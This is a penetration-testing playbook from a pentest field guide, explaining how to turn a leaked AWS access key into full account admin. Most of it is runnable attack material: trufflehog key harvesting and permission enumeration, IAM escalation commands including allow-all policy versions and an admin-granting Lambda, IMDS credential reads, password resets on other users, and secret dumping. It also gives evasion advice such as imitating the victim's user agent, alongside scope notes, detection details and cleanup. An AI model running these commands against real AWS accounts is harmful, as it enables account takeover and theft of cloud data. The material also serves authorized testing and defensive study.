---
tags:
  - hack-notes
  - playbook
  - aws
---

# AWS Leaked Key to IAM Privilege Escalation Playbook

> A long-lived `AKIA...` access key surfaces in a public repo, leaked `.env`, S3 object, CI log, or decompiled mobile app, and you walk it from low-priv principal to full account admin and the data behind it.

> **Attack graph position**
> **Fed by:** Entry point (a leaked long-lived key); [Poisoned CI Pipeline to Cloud Admin](Poisoned%20CI%20Pipeline%20to%20Cloud%20Admin.md) (exfiltrated secrets / OIDC).
> **Feeds into:** End state: AWS account admin. Converges with [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md).
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance

| | |
|---|---|
| Goal | Turn a discovered IAM access key into AdministratorAccess and reach sensitive data |
| Starting position | One `AKIA`/`ASIA` access key + secret (and maybe a session token), unknown privilege |
| End state | AdministratorAccess on the principal (or an admin role you can assume), data access proven |
| Key techniques | T1552.001 Credentials in Files, T1078.004 Valid Accounts Cloud, T1098 Account Manipulation, T1548 Abuse Elevation Control, T1530 Data from Cloud Storage |
| Prerequisites | Valid non-rotated key, principal holds at least one IAM privesc primitive OR a path to one (AssumeRole, secrets) |
| Difficulty | Low to Medium (Low when a privesc primitive is directly attached, Medium when you must pivot) |
| Noise level | Loud by default (brute-force enumeration and IAM mutations are heavily logged); can be made Moderate |

## Attack Path

```
Discover key (trufflehog / .env / S3 / CI log / mobile APK)
        |
        v
[1] Validate + identify  ->  aws sts get-caller-identity
        |                     (Access denied on everything? -> quarantine policy, see Troubleshooting)
        v
[2] Enumerate effective perms
        |   own-perms readable?  --yes-->  get-account-authorization-details / cloudfox
        |   own-perms blind?     --no--->  enumerate-iam brute force (LOUD)
        v
[3] Find a privesc primitive (pacu iam__privesc_scan --scan-only / cloudfox)
        |
        |--- HAS direct primitive --------------------------------+
        |       CreatePolicyVersion | Attach/PutUserPolicy        |
        |       PassRole+compute | AddUserToGroup | CreateAccessKey|
        |       UpdateLoginProfile/CreateAccessKey on other user  |
        |                                                          v
        |--- NO direct primitive --> BRANCH:               [4] Exploit to admin
        |       sts:AssumeRole into stronger role                 |
        |       secrets in Secrets Manager / SSM                  v
        |       lateral via service (lambda/ec2/ecs)       [5] Confirm admin
        |                                                          |
        +----------------------------------------------------------+
                                                                   v
                                                          [6] Establish access + reach data
```

## Prerequisites and Setup

- The discovered key pair. Long-lived keys start `AKIA`; temporary STS creds start `ASIA` and require a session token (and expire, so move fast).
- An attacker AWS CLI v2 host. Configure an isolated named profile so you never mix the key with your own creds:
  ```bash
  aws configure --profile loot
  # paste AKIA..., the secret, region us-east-1, output json
  # for temporary ASIA creds, also export the token:
  export AWS_ACCESS_KEY_ID=ASIA...
  export AWS_SECRET_ACCESS_KEY=...
  export AWS_SESSION_TOKEN=...
  ```
- Tooling: `aws` CLI v2, [Pacu](https://github.com/RhinoSecurityLabs/pacu), [CloudFox](https://github.com/BishopFox/cloudfox) (v1.17.0+, earlier builds broke after an AWS service-map format change), [enumerate-iam](https://github.com/andresriancho/enumerate-iam), [trufflehog](https://github.com/trufflesecurity/trufflehog), and `jq`.
- Authorization: scope must explicitly permit credential exploitation of the target account. IAM mutations against a real tenant are intrusive; confirm the account ID returned in Step 1 is in scope before any write call.
- A clean source IP. CloudTrail records `sourceIPAddress`; reuse one egress IP so anomaly models see a single actor rather than a spray.

## Walkthrough

### Step 0. Discover the key (GitHub leak angle)

What and why: before you have a key, find one. Public and recently-private repos, gists, issue and PR comments are the richest seam. trufflehog validates each hit against `sts:GetCallerIdentity` so you only chase live keys.

```bash
# whole org, member repos + wikis + comments, only live creds
trufflehog github --org=targetcorp --token=$GH_PAT \
  --issue-comments --pr-comments --only-verified

# a single repo including full git history (deleted-but-present commits)
trufflehog git https://github.com/targetcorp/app.git --only-verified

# a local .env, CI artifact dump, or unpacked APK directory
trufflehog filesystem ./loot --only-verified
```

Other seams: a leaked `.env` (`grep -RInE 'AKIA[0-9A-Z]{16}' .`), a world-readable S3 object, a verbose CI log (GitHub Actions, GitLab, Jenkins console output), and decompiled mobile apps (`apktool d app.apk` then grep `res/` and `assets/` and smali strings).

Success signal: trufflehog prints a `Verified` result with `AWSAccessKeyID` and the account it belongs to.

Decision: a key removed from the repo is often NOT revoked. GitHub secret scanning notifies AWS, but deletion from code does not invalidate the secret, and real leaks have stayed valid for ~48 hours after takedown. Always test the key; a "fixed" commit means nothing until the key is rotated at the provider.

### Step 1. Validate the key and identify the principal

What and why: the cheapest possible call. It tells you the key works, the account, and whether you are a user or an assumed role. It is logged but unavoidable and low-signal.

```bash
aws sts get-caller-identity --profile loot
```

Success signal:
```json
{
  "UserId": "AIDA...",
  "Account": "123456789012",
  "Arn": "arn:aws:iam::123456789012:user/svc-deploy"
}
```
`user/...` is a long-lived IAM user (your `AKIA` key). `assumed-role/...` means an `ASIA` session, often from an EC2/ECS/Lambda role, and it expires.

Decision: if this single call returns `AccessDenied` or `InvalidClientTokenId`, the key is dead or quarantined. `InvalidClientTokenId` = revoked/deleted. An `AccessDenied` on nearly everything while `get-caller-identity` still works is the signature of the `AWSCompromisedKeyQuarantine` policy (see Troubleshooting). Confirm the `Account` is in scope before proceeding.

### Step 2. Enumerate the principal's effective permissions

What and why: you need to know what this principal can do. Two roads: a quiet read of your own policy if you have IAM read perms, or a loud brute force if you are blind.

Quiet path (you have `iam:Get*`/`iam:List*`). Pull your own attached and inline policies:

```bash
U=svc-deploy
aws iam list-attached-user-policies --user-name $U --profile loot
aws iam list-user-policies --user-name $U --profile loot
aws iam list-groups-for-user --user-name $U --profile loot
# resolve a managed policy document
aws iam get-policy-version \
  --policy-arn arn:aws:iam::aws:policy/SomePolicy \
  --version-id v1 --profile loot
```

Account-wide gold (one call, the whole IAM graph) if you have `iam:GetAccountAuthorizationDetails`:

```bash
aws iam get-account-authorization-details --profile loot > aad.json
# who is attached to admin?
jq '.UserDetailList[],.RoleDetailList[]
    | select(.AttachedManagedPolicies[]?.PolicyName=="AdministratorAccess")
    | .Arn' aad.json
```

Tooled path with CloudFox (situational awareness, maps who can privesc):

```bash
cloudfox aws --profile loot all-checks
cloudfox aws --profile loot permissions     # effective perms per principal
cloudfox aws --profile loot principals
cloudfox aws --profile loot role-trusts      # trust policies, cross-account, AssumeRole edges
cloudfox aws --profile loot secrets          # Secrets Manager + SSM Parameter Store refs
```

Blind path (no IAM read). Brute-force every safe `get*`/`list*`/`describe*` to learn what you hold:

```bash
python enumerate-iam.py \
  --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --region us-east-1
```

Success signal: a list of allowed actions/services. Even read-only results reveal the attack surface (does the principal touch IAM, Lambda, EC2, Secrets Manager, S3?).

Decision: `enumerate-iam` is extremely noisy (thousands of API calls in seconds, a clear CloudTrail and GuardDuty trip). Prefer the quiet path when any IAM read works. If you must brute force, accept the noise and move fast, because a defender can lock the key out mid-run.

### Step 3. Identify a privilege escalation primitive

What and why: map your perms to a known IAM privesc primitive. Pacu's `iam__privesc_scan` encodes the Rhino Security Labs method set (the canonical ~21 paths) and will both find and, if you let it, auto-exploit them.

```bash
# import the key into Pacu
pacu
> import_keys --all          # or set_keys to paste manually
> run iam__enum_permissions  # build the perms model first
> run iam__privesc_scan --scan-only
```

`--scan-only` reports candidate escalation methods without firing them. Read the output, then exploit deliberately by hand so you control every artifact (cleaner than letting Pacu auto-run).

The primitives to look for, in rough order of reliability:

- `iam:CreatePolicyVersion` on a policy attached to you. Define your own permissions, set as default in one call.
- `iam:AttachUserPolicy` / `iam:AttachGroupPolicy` / `iam:AttachRolePolicy`. Attach `AdministratorAccess` directly.
- `iam:PutUserPolicy` / `iam:PutGroupPolicy` / `iam:PutRolePolicy`. Inline an allow-`*` policy onto yourself.
- `iam:AddUserToGroup`. Join a group that already has admin.
- `iam:CreatePolicy` + `iam:AttachUserPolicy`. Author and attach a fresh admin policy.
- `iam:SetDefaultPolicyVersion`. Roll an attached policy back to an older, more permissive version.
- `iam:PassRole` + a compute/orchestration launch action: `lambda:CreateFunction`+`lambda:InvokeFunction`, `ec2:RunInstances`, `glue:CreateDevEndpoint`/`glue:CreateJob`, `sagemaker:CreateNotebookInstance`/`CreateTrainingJob`, `cloudformation:CreateStack`, `datapipeline:CreatePipeline`. Pass an existing admin role to a service you control, then use its creds.
- `iam:UpdateLoginProfile` / `iam:CreateLoginProfile` on another user. Set a console password for a higher-priv user.
- `iam:CreateAccessKey` on another user. Mint programmatic keys for a more privileged principal.
- `iam:CreateAccessKey` on yourself. Not escalation, but a durable second credential (persistence, and it survives the original key being rotated for a window).
- `sts:AssumeRole` into a role whose trust policy is too broad (see Step 4 branch).

Success signal: at least one method above maps to a permission you confirmed in Step 2.

Decision: if Pacu/CloudFox surface NO self-contained primitive on this principal, do not stop. Go to Step 4 (the pivot branch). The single most common mistake is calling a principal "low-priv, dead end" without checking AssumeRole edges and stored secrets.

### Step 4. Exploit the primitive to admin

What and why: execute the cleanest available primitive. Concrete sequences for each follow. Pick ONE, keep the artifact list for Cleanup.

Primitive A: `iam:CreatePolicyVersion` (quiet, single mutation). Find a customer-managed policy attached to you, then overwrite its default version with allow-all:

```bash
cat > /tmp/admin.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF

aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/deploy-policy \
  --policy-document file:///tmp/admin.json \
  --set-as-default --profile loot
```
`--set-as-default` needs only `CreatePolicyVersion`, not `SetDefaultPolicyVersion`. A managed policy holds max 5 versions; if full, you must delete a non-default version first (record it for Cleanup).

Primitive B: `iam:AttachUserPolicy` (loud, obvious). Attach the AWS-managed admin policy:

```bash
aws iam attach-user-policy \
  --user-name svc-deploy \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile loot
```

Primitive C: `iam:PutUserPolicy` (inline, no policy object to enumerate later):

```bash
aws iam put-user-policy \
  --user-name svc-deploy \
  --policy-name diag \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --profile loot
```

Primitive D: `iam:PassRole` + `lambda:CreateFunction` (when you can pass a privileged role to Lambda). Ship a function that returns the role's creds, or that calls IAM directly:

```bash
# a tiny handler that attaches admin to us using the passed role's perms
cat > index.py <<'EOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='svc-deploy',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
    return 'ok'
EOF
zip f.zip index.py

aws lambda create-function --function-name diag-fn \
  --runtime python3.12 --handler index.handler \
  --role arn:aws:iam::123456789012:role/admin-lambda-role \
  --zip-file fileb://f.zip --profile loot

aws lambda invoke --function-name diag-fn /tmp/out.json --profile loot
```

Primitive D-alt: `iam:PassRole` + `ec2:RunInstances`. Launch an instance with an admin instance profile, then read its creds from IMDS once you have shell (or via SSM). Concrete IMDSv2 read once on the box:
```bash
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 300')
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```
See [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md) for the full IMDS exploitation path.

Primitive E: `iam:UpdateLoginProfile` / `iam:CreateAccessKey` on a stronger user:

```bash
# give an admin user a console password we choose
aws iam update-login-profile \
  --user-name admin-bob --password 'Pwn3d!Pwn3d!23' --profile loot
# or, if they have no login profile yet:
aws iam create-login-profile \
  --user-name admin-bob --password 'Pwn3d!Pwn3d!23' --no-password-reset-required --profile loot
# or mint API keys for them
aws iam create-access-key --user-name admin-bob --profile loot
```

Primitive F: `iam:AddUserToGroup` into an admin group:
```bash
aws iam list-groups --profile loot       # find one with AdministratorAccess
aws iam add-user-to-group --group-name Admins --user-name svc-deploy --profile loot
```

The pivot BRANCH (no direct primitive on this principal):

- AssumeRole into a stronger role. Enumerate trust policies (`cloudfox aws role-trusts` or read `aad.json`). Look for a role whose trust principal includes your ARN, `root` of your account, or `*`. Assume it:
  ```bash
  aws sts assume-role \
    --role-arn arn:aws:iam::123456789012:role/app-admin \
    --role-session-name s --profile loot
  ```
  Then re-run Step 2/3 with the returned `ASIA` creds, which may themselves hold a privesc primitive.
- Secrets in Secrets Manager / SSM. Stored creds are a frequent jump to a more powerful principal:
  ```bash
  aws secretsmanager list-secrets --profile loot
  aws secretsmanager get-secret-value --secret-id prod/db --profile loot
  aws ssm describe-parameters --profile loot
  aws ssm get-parameters-by-path --path / --recursive \
    --with-decryption --profile loot
  ```
- Lateral via service. `lambda:UpdateFunctionCode` on an existing admin-role function, `ecs:RunTask` / `ecs:RegisterTaskDefinition` + `iam:PassRole`, `ssm:SendCommand` onto an instance with a fat role, or `codebuild:*` to run in a privileged build role. Each lands you a stronger set of creds; loop back to Step 2.

Success signal: the mutation returns 200 / a populated JSON object with no `AccessDenied`.

### Step 5. Confirm admin

What and why: prove the escalation took before you act on it. New IAM grants are near-instant but can lag a few seconds.

```bash
# simulate the strongest action against the loot principal
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/svc-deploy \
  --action-names '*' iam:CreateUser ec2:TerminateInstances \
  --profile loot
# or just do something only admin can: list every key in the account
aws iam list-users --profile loot
aws iam list-access-keys --user-name admin-bob --profile loot
```

Success signal: `simulate-principal-policy` returns `EvalDecision: allowed` for `*`, or a previously-denied admin call now succeeds.

### Step 6. Establish access and reach the data

What and why: with admin, the objective is the data (the actual engagement deliverable), plus a controlled foothold. Stop at proof, do not exfiltrate or destroy.

```bash
# inventory the crown jewels
aws s3 ls --profile loot
aws s3api list-buckets --profile loot
aws rds describe-db-instances --profile loot
aws dynamodb list-tables --profile loot
# prove access to one sensitive object (head, do not bulk download)
aws s3api head-object --bucket prod-customer-data --key export.csv --profile loot
```

If persistence is in scope, a single fresh access key on a benign-looking principal is the quietest durable foothold (`iam:CreateAccessKey` on yourself in Step 3). Record it for Cleanup.

Success signal: you can enumerate and head-read the sensitive store the engagement targets.

## OPSEC and Detection

What this chain lights up:

- CloudTrail (management events, on by default). Every IAM mutation is recorded: `CreatePolicyVersion`, `AttachUserPolicy`, `PutUserPolicy`, `CreateAccessKey`, `UpdateLoginProfile`, `CreateLoginProfile`, `AddUserToGroup`, `CreateFunction`, `RunInstances`, `AssumeRole`. Each carries `userIdentity.accessKeyId`, `sourceIPAddress`, and `userAgent` (the default `aws-cli/2.x ... botocore` and Pacu's UA both stand out).
- GuardDuty IAM finding types fire on this exact behavior: anomalous IAM API invocations flagged by the ML model (new principal, new geography, new API), `Recon:IAMUser/*`, `PrivilegeEscalation:IAMUser/*`, `Persistence:IAMUser/*`, and for the EC2/IMDS branch `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` and `.InsideAWS` (the InsideAWS variant, added Jan 2022, catches creds used from a different AWS account, so launching the attacker box inside AWS does not hide it).
- `AWSCompromisedKeyQuarantineV3` auto-attach. When the leak is detected (GitHub secret scanning notifies AWS, or AWS's own monitors fire), AWS proactively attaches the quarantine policy to the user, denying ~89 high-risk actions including `iam:CreateAccessKey`, `iam:AttachUserPolicy`, `ec2:RunInstances`, `lambda:CreateFunction`. Note V3 is identical to V2 and V2 is still the live default; some privileged actions remain permitted, so a quarantined key is throttled, not always dead.
- The `enumerate-iam` brute force is the single loudest moment in the chain (thousands of calls in seconds), an unmistakable CloudTrail burst and a GuardDuty recon trigger.

Reducing noise:

- Prefer the quiet enumeration path (read your own policy / `get-account-authorization-details`) over `enumerate-iam`. One read versus thousands.
- Choose the lowest-mutation primitive. `CreatePolicyVersion` and `PutUserPolicy` are one call each; `AttachUserPolicy` with the AWS-managed admin ARN is the most signatured event in the set.
- Pace IAM writes; avoid a tight burst of distinct IAM mutations from one key, which is exactly what the anomaly model scores.
- Keep one stable source IP and, where the engagement allows, a `--user-agent`/`botocore` profile that matches the victim's normal automation rather than `pacu`.
- Move fast once you start writing. The window between leak-detection auto-quarantine and your admin grant can be short.

## Cleanup

Revert every artifact you created, in reverse order:

```bash
# Primitive A: drop the malicious policy version, restore prior default
aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/deploy-policy --profile loot
aws iam set-default-policy-version --policy-arn ...:policy/deploy-policy --version-id v1 --profile loot
aws iam delete-policy-version --policy-arn ...:policy/deploy-policy --version-id v6 --profile loot

# Primitive B/F: detach managed policy / remove from group
aws iam detach-user-policy --user-name svc-deploy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile loot
aws iam remove-user-from-group --group-name Admins --user-name svc-deploy --profile loot

# Primitive C: delete the inline policy
aws iam delete-user-policy --user-name svc-deploy --policy-name diag --profile loot

# Primitive D: delete the Lambda (and any role/instance you launched)
aws lambda delete-function --function-name diag-fn --profile loot
aws ec2 terminate-instances --instance-ids i-0abc... --profile loot

# Primitive E: remove the login profile / access key you set on another user
aws iam delete-login-profile --user-name admin-bob --profile loot
aws iam delete-access-key --user-name admin-bob --access-key-id AKIA... --profile loot

# Persistence: delete any access key you minted for yourself
aws iam delete-access-key --user-name svc-deploy --access-key-id AKIA... --profile loot

# If you created a fresh policy object
aws iam delete-policy --policy-arn arn:aws:iam::123456789012:policy/pwn --profile loot
```

Report the leaked key itself to the client for rotation; do not leave it live. Keep the full artifact ledger (ARNs, version-ids, key-ids, instance-ids) in your notes as you go so nothing is orphaned.

## Troubleshooting

- Everything returns `AccessDenied` but `get-caller-identity` works: the `AWSCompromisedKeyQuarantine` policy is attached. The key is throttled to ~89 denied actions. Test what is still allowed (`simulate-principal-policy`, read-only calls); some privesc paths may survive, but expect the client to rotate imminently. This is a detection signal, not just a block.
- `InvalidClientTokenId` / `SignatureDoesNotMatch`: key revoked, deleted, or you copied the secret wrong (trailing whitespace, wrapped line). Re-extract from source.
- `ExpiredToken` (ASIA only): the session token timed out. STS sessions are short-lived; re-obtain creds (e.g. re-leak from the same IMDS/CI source) and move faster.
- Region errors / `endpoint` failures: IAM and STS are global but pin a region (`--region us-east-1`); some services (`secretsmanager`, `lambda`) are regional, so enumerate the right region. Check `aws ec2 describe-regions` for enabled regions.
- Mutation denied despite the permission appearing present: an SCP at the org/OU level can deny the action above IAM. SCPs are invisible from inside a member account; if a permission you clearly hold still returns `AccessDenied` with `explicitDeny`, suspect an SCP boundary and pivot to another primitive or another account.
- `CreatePolicyVersion` fails with a version-limit error: the policy already has 5 versions. Delete a non-default version first (record it), then retry.
- Permission boundary on the principal: an `iam:PermissionsBoundary` caps the principal's effective perms regardless of attached policies, so `AttachUserPolicy` "succeeds" but you are still not admin. Check `aws iam get-user --user-name svc-deploy` for `PermissionsBoundary`; if present, you must escalate via a primitive that creates or assumes a DIFFERENT principal (PassRole+compute, AssumeRole, CreateAccessKey on another user) rather than buffing yourself.
- `PassRole` denied: the role's path or the `iam:PassRole` resource constraint excludes your target role; enumerate roles you ARE allowed to pass, or chain through a service that lets you pick the role.

## Variations and Pivots

- Temporary-creds start (`ASIA`): you likely came from IMDS SSRF, a leaked CI OIDC session, or container creds. Same chain from Step 2, but race the expiry. Cross-link [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md).
- CI/CD leak origin: keys in pipeline logs or repo secrets often belong to a deploy role with `iam:*` or `PassRole` already, a fast path to admin. See [CICD Pipeline](../Checklists/CICD%20Pipeline.md) and [CICD and Supply Chain](../Cheatsheets/CICD%20and%20Supply%20Chain.md).
- Mobile origin: keys hardcoded in an APK/IPA frequently belong to over-scoped service users (S3, Cognito, SNS). Decompile, grep, then run this chain.
- No IAM privesc anywhere: the data may be directly reachable without admin. If the principal already reads the target S3/RDS/DynamoDB, skip escalation and go straight to Step 6.
- Cross-account: an assumable role in a second account restarts the whole chain there; treat each account as a fresh target.
- Org takeover: from member-account admin, look for a management-account role you can assume, or `organizations:*`, to reach the org root.
- Escalate the engagement: feed proven paths into [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md) for breadth coverage and pivot enumeration into [OSINT and Reconnaissance](../Checklists/OSINT%20and%20Reconnaissance.md) for further leaked-secret seams.

## Related

- [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md)
- [AWS Pentest](../Cheatsheets/AWS%20Pentest.md)
- [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md)
- [CICD Pipeline](../Checklists/CICD%20Pipeline.md)
- [OSINT and Reconnaissance](../Checklists/OSINT%20and%20Reconnaissance.md)
- [CICD and Supply Chain](../Cheatsheets/CICD%20and%20Supply%20Chain.md)
- [OSINT and Recon](../Cheatsheets/OSINT%20and%20Recon.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
